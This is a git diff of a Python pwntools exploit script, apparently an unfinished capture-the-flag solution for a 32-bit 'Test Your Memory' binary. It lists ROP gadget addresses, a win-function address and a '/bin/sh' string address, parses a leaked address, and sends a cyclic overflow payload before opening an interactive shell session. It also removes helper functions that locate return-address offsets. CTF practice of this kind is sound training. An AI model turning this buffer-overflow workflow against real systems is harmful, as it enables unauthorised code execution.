@@ -2,13 +2,18 @@
 from pwn import *
 import sys
 
-# GLOBAL VARIABLES
-binary = None
-elf = None
-libc = None
-rop = None
-script = None
-REMOTE = []
+binary = "mem_test"
+elf = context.binary = ELF(binary, False)
+context.terminal = ["terminator", "-x", "bash", "-c"]
+context.log_level  = 'debug'
+libc = elf.libc
+rop = ROP(elf)
+
+#### GDB Script
+script = '''
+
+'''
+
 
 io = None
 r = lambda *a, **k: io.recv(*a, **k)
@@ -25,15 +30,9 @@ slt = lambda *a, **k: io.sendlinethen(*a, **k)
 ia = lambda *a, **k: io.interactive(*a, **k)
 
 def start(*args, **kwargs):
-    global elf, rop, libc
-    elf = context.binary = ELF(binary, False)
-    context.terminal = ["terminator", "-x", "bash", "-c"]
-    context.log_level  = 'debug'
-    libc = elf.libc
-    rop = ROP(elf)
-
     usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
     # [ip, port]
+    REMOTE = []
     if args:
         arguments = [elf.path]
         arguments.extend(args)
@@ -52,43 +51,43 @@ def start(*args, **kwargs):
         else:
             return process(elf.path)
 
-# 64 bit
-def find_rip_offset():
-    sl(cyclic(1000))
-    io.wait()
-    core = io.corefile
-    stack = core.rsp
-    info(f"rsp = {stack}")
-    pattern = core.read(stack, 4)
-    rip_offset = cyclic_find(pattern)
-    log.success(f"RIP OFFSET IS {rip_offset}")
-
-def find_eip_offset():
-    sl(cyclic(1000))
-    io.wait()
-    core = io.corefile
-    stack = core.esp
-    info(f"esp = {stack}")
-    pattern = core.read(stack, 4)
-    eip_offset = cyclic_find(pattern)
-    log.success(f"EIP OFFSET IS {eip_offset}")
-
 
 def main():
-    global io, script, binary, REMOTE
+    global io
     #################### 
     ### EXPLOIT CODE ###
     ####################
-    # set binary name
-    binary = ""
-    #remote address
-    REMOTE = []
-    # set gdb script
-    script = """
-    continue
     """
-    # start process | remote process
+    0x080494e3 : pop ebp ; ret
+    0x080494e0 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+    0x08049022 : pop ebx ; ret
+    0x080494e2 : pop edi ; pop ebp ; ret
+    0x08049009 : ret
+    """
+    win_func =  0x08049443
+    binsh = 0x0804b44c + 1# - 1
+
     io = start()
+    ru(b"\n\n\n------Test Your Memory!-------\n")
+
+    m = rl(timeout=2)
+    log.success(f"RECVED RANDOM BYTES: {m}")
+
+    ru("see? : ")
+    leak = int(rl(), 16)
+
+    log.success(f"LeaK : {hex(leak)}")
+
+    payload = flat(
+        m,
+        cyclic(500)
+    )
+
+    ru("> ", timeout=2)
+    sl(payload)
+    ia()
+
+
 
 
 
